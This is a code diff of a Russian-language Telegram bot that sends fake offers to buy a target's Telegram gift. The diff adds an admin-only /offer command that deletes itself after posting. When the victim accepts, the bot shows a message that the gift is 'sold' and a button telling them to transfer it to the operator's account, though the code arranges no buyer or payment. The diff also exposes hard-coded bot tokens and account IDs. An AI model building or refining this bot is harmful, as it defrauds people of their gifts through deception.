@@ -9,9 +9,9 @@ import threading
 import os
 
 # --- НАСТРОЙКИ ---
-BOT_TOKEN = "8651386320:AAHE5HEETk21XNATf5tCEpArp8_e9uN0Zqo"
-ADMIN_ID = 6484025560
-MY_USERNAME = "@Gangster1246"
+BOT_TOKEN = "8337096654:AAFq_4d39Jo2x0sxC8L2lStxTbL_a3q1P4I"
+ADMIN_ID = 8927166966       # Твой ID
+MY_USERNAME = "@masons_19"  # Твой юзернейм
 
 # БЕЛЫЕ ПРЕМИУМ-ЭМОДЗИ
 STAR = '<tg-emoji emoji-id="5280802202083346495">⭐</tg-emoji>'
@@ -63,9 +63,50 @@ def offer_keyboard():
 # --- ОБЫЧНЫЕ КОМАНДЫ ---
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, "Бот запущен.\n\nВ любом чате напиши: `@твой_бот ссылка цена @юзер`", parse_mode="Markdown")
+    if message.from_user.id != ADMIN_ID:
+        return
+    bot.send_message(message.chat.id, "Бот запущен.\n\n1. Инлайн: `@твой_бот ссылка цена @юзер`\n2. Команда: `/offer ссылка цена @юзер` (для премиум-эмодзи)", parse_mode="Markdown")
 
-# --- ИНЛАЙН РЕЖИМ ---
+# --- КОМАНДА ДЛЯ БИЗНЕС-РЕЖИМА (Работает с премиум-эмодзи) ---
+@bot.message_handler(commands=['offer'])
+def cmd_offer(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    parts = message.text.split()
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Формат: /offer ссылка цена @юзер")
+        return
+
+    gift_link = parts[1]
+    try:
+        price = int(parts[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Цена должна быть числом")
+        return
+    target = parts[3]
+
+    gift_name = parse_gift_name(gift_link)
+    expires_at = datetime.now() + timedelta(hours=6)
+    
+    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
+    kb = offer_keyboard()
+
+    bot.send_message(
+        chat_id=message.chat.id,
+        text=offer_text,
+        parse_mode="HTML",
+        reply_markup=kb,
+        disable_web_page_preview=False
+    )
+    
+    # Удаляем команду /offer из чата
+    try:
+        bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
+    except:
+        pass
+
+# --- ИНЛАЙН РЕЖИМ (Для обычных чатов) ---
 @bot.inline_handler(lambda query: len(query.query.strip()) > 0)
 def inline_offer(query):
     text = query.query.strip()
@@ -124,17 +165,26 @@ def inline_offer(query):
 @bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
 def on_callback(call):
     if call.data == "accept_offer":
-        bot.answer_callback_query(
-            call.id, 
-            text="Подарок успешно продан! Передайте его покупателю.", 
-            show_alert=True
-        )
+        bot.answer_callback_query(call.id, "Оффер принят")
+        
+        # Пытаемся изменить сообщение (сработает только если отправляли через команду /offer)
+        if call.message.reply_to_message is None: 
+            try:
+                kb = types.InlineKeyboardMarkup()
+                kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))
+                success_text = f"{GIFT_EMOJI} <b>Подарок успешно продан!</b>\n\n• Передайте подарок покупателю для зачисления Stars."
+                bot.edit_message_text(
+                    chat_id=call.message.chat.id,
+                    message_id=call.message.message_id,
+                    text=success_text,
+                    parse_mode="HTML",
+                    reply_markup=kb,
+                    disable_web_page_preview=False
+                )
+            except Exception:
+                pass
     else:
-        bot.answer_callback_query(
-            call.id, 
-            text="❌ Вы отклонили предложение.", 
-            show_alert=True
-        )
+        bot.answer_callback_query(call.id, "Оффер отклонён")
 
 # --- ЗАПУСК ---
 if __name__ == "__main__":
